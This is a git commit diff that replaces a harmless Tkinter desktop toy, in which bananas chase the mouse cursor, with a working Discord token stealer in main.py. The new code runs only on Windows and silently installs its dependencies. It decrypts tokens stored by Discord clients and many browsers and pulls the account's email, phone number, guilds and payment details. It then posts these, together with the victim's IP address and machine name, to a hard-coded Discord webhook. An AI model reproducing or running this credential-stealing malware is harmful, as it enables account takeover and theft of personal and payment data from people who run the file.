5394ffca32a5f45a05de7401db24ca1964282952
eroge-69 <erogexunamed@gmail.com>
2025-08-18 13:56:02 +0700

    Upload main.py via PY to EXE tool

--- python-files/main.py
+++ python-files/main.py
@@ -1,108 +1,213 @@
-import tkinter as tk
-from tkinter import PhotoImage, Canvas
-import ctypes
-import pyautogui
-import random
+import os
+if os.name != "nt":
+    exit()
+import subprocess
+import sys
+import json
+import urllib.request
+import re
+import base64
+import datetime
 
-class Banana:
-    def __init__(self, scene, x=0, y=0):
-        self.scene = scene
-        self.image = PhotoImage(file='banana1.png')
-        self.image = self.image.subsample(16)
-        self.image_bomb = PhotoImage(file='bomb.png')
-        self.image_bomb = self.image_bomb.subsample(8)
-        self.imageRef = scene.canvas.create_image(x,y,image=self.image)
-        self.bomb_status = False
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
 
-    def update(self):
-        x, y = pyautogui.position()
-        ban_x, ban_y = self.scene.canvas.coords(self.imageRef)
-        dist = (abs(x-ban_x)+abs(y-ban_y))
-        if self.bomb_status:
-            self.scene.canvas.move(
-                self.imageRef,
-                random.choice((-30, 30)),
-                random.choice((-30, 30))
-            )
-            self.scene.canvas.itemconfig(self.imageRef, image=self.image)
-            for _ in range(10):
-                self.scene.new_banana(
-                    random.randint(0, self.scene.screen_width),
-                    random.randint(0, self.scene.screen_height), 
-                )
-            self.bomb_status = False
-        elif dist < 5:
-            self.scene.canvas.itemconfig(self.imageRef, image=self.image_bomb)
-            self.bomb_status = True
-        else:
-            numero = random.choice((1,2,5))
-            self.scene.canvas.move(
-                self.imageRef,
-                numero if x > ban_x else -numero,
-                numero if y > ban_y else -numero
-            )
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
 
-class Scene:
-    def __init__(self, window: tk.Tk):
-        self.screen_width = window.winfo_screenwidth()
-        self.screen_height = window.winfo_screenheight()
-        self.canvas = Canvas(
-            window, 
-            width=self.screen_width,
-            height=self.screen_height, 
-            highlightthickness=0,  
-            bg='white'
-        )
-        self.canvas.pack()
-        self.bananas = list()
+import win32crypt
+from Crypto.Cipher import AES
 
-    def update(self):
-        for banana in self.bananas:
-            banana.update()
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
 
-    def new_banana(self, x, y):
-        banana = Banana(self)
-        self.canvas.move(banana.imageRef, x, y)
-        self.bananas.append(banana)
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
 
-class Game:
-    def __init__(self):
-        self.window = self.create_window()
-        self.apply_click_through(self.window)
-        self.scene = Scene(self.window)
+    if token:
+        headers.update({"Authorization": token})
 
-    def update(self):
-        self.scene.update()
-        self.window.after(5, self.update)
+    return headers
 
-    def create_window(self):
-        window = tk.Tk()
-        window.wm_attributes("-topmost", True)
-        window.attributes("-fullscreen", True) 
-        window.overrideredirect(True)
-        # Transparencia
-        window.attributes('-transparentcolor', 'white')
-        window.config(bg='white')
-        return window
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
 
-    def apply_click_through(self, window):
-        # Constantes API windows
-        WS_EX_TRANSPARENT = 0x00000020
-        WS_EX_LAYERED = 0x00080000
-        GWL_EXSTYLE = -20
+    if not os.path.exists(path):
+        return tokens
 
-        # Obtener el identificador de ventana (HWND)
-        hwnd = ctypes.windll.user32.GetParent(window.winfo_id())
-        # Obtener los estilos actuales de la ventana
-        style = ctypes.windll.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
-        # Establecer nuevo estilo
-        style = style | WS_EX_TRANSPARENT | WS_EX_LAYERED
-        ctypes.windll.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, style)
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
 
-    def start(self):
-        self.update()
-        self.window.mainloop()
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
 
-game = Game()
-game.scene.new_banana(100,100)
-game.start()
+    return tokens
+    
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+
+    return key
+
+def getip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
+
+def main():
+    checked = []
+
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Bilgileri:\n```yaml\nNitro Var mı: {has_nitro}\nBitiş Tarihi: {exp_date}\nMevcut Boostlar: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Bilgileri:\n```yaml\nMevcut Boostlar: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nÖdeme Yöntemleri:\n```yaml\nToplam: {payment_methods}\nGeçerli Yöntemler: {valid} adet\nTür: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**Yeni Kullanıcı: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nDiscord İd: {res_json['id']}\nGmail: {res_json['email']}\nTelefon Numarası: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "LorjaN"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "LorjaN",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(urllib.request.Request('https://canary.discord.com/api/webhooks/1403741218609041502/KHc3nON9hisAec1gSeV5QwssF9IwQRvjU1DoSox8yddEO7J0g3XeJgMoFwqlDYykjB9H', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
+            except Exception as e:
+                print(f"ERROR: {e}")
+                continue
+
+if __name__ == "__main__":
+    main()
